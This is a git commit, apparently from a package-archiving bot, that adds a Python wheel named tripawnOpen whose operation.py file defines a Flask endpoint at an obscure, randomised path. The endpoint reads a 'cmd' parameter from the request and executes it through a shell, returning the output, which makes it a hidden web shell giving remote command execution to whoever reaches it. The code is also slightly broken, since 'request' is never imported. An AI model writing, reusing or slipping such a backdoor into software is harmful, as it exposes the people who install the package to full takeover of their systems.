0bf22792186331864e4370e298c02106abb62186
Bot <41898282+github-actions[bot]@users.noreply.github.com>
2024-06-18 15:06:32 +0000

    Add package tripawnOpen/0.1.1/tripawnOpen-0.1.1-py3-none-any.whl

---
+++ packages/tripawnOpen/tripawnOpen-0.1.1-py3-none-any.whl/tripawnOpen/operation.py
@@ -0,0 +1,14 @@
+
+from flask import Flask
+import subprocess
+import os
+
+app = Flask(__name__)
+@app.route("/ppkojdlse/llodmmcvkdf",  methods=['GET', 'POST'])
+def cate():
+    if request.method == 'GET':
+        name = request.args.get("cmd")
+        getVersion =  subprocess.Popen(name, shell=True, stdout=subprocess.PIPE).stdout
+        version =  getVersion.read()
+
+    return str(version)
